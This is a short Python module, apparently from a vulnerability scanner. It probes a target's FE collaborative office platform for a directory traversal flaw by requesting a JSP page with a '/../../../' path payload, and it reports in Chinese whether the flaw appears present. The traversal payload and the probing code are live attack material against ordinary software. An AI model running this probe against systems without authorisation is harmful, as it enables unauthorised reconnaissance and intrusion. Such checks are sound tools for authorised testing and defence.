import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging


def fe_oa_directiry(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + '/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers)
        if response.status_code == 200:
            print(Vcolors.RED + "[+]  该系统可能存在目录遍历漏洞，具体URL为:{}".format(url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] FE协作办公平台目录遍历漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("fe_oa_directiry脚本出现异常")




